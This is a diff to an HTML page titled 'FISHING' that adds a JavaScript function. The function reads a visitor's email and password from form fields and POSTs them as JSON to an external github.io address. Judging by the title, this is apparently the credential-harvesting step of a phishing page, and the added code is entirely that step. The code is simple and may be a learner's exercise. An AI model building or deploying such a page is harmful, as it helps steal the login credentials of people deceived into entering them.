@@ -41,6 +41,22 @@
             }
             else alert("Hello not there")
         }
+        function submitForm() {
+            const email = document.querySelector('#email1').value;
+            const password  = document.querySelector('#pass1').value;
+
+        // Make an HTTP request to the server
+            fetch('https://junaid-55.github.io/process-login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email, password }),
+             })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error:', error));
+        }
     </script>
     <title>FISHING</title>
 </head>
